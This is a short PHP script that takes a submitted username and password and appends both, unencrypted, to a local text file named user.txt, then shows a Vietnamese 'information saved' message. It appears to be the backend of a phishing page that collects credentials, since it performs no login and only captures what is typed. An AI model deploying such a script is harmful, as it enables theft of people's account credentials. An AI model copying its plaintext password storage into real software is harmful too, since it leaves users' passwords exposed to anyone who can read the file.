<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare the data to be saved
    $data = "Username: $username, Password: $password\n";

    // Save to user.txt
    file_put_contents('user.txt', $data, FILE_APPEND | LOCK_EX);

    // Optionally, redirect back to the login page or show a success message
    echo "Thông tin đã được lưu!";
}
?>